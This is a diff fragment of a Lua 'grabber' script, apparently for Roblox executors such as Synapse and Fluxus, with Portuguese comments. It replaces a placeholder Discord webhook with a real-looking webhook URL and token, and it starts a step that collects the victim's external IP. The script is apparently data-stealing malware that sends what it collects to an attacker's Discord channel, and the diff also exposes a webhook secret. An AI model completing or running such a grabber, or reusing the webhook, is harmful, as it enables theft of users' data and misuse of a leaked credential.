@@ -1,5 +1,5 @@
 -- bf_grabber.lua – roda em Synapse/Fluxus/etc. (executor compatível com http e io)
-local WEBHOOK = "https://discord.com/api/webhooks/XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+local WEBHOOK = "https://discord.com/api/webhooks/1478447252405092412/GRmSBEzd-cbJlSrfe39RmW3sN3BNeC1Hsp6-g3ZUetjhf0Wk8EovXQwIr_xv_J7u4Oso"
 local PORT    = 50000           -- porta interna para o "pseudo-link", se quiser
 --[[ CONFIG ––––––––– ]]--
 --[[ 0. obter IP externo ]]--
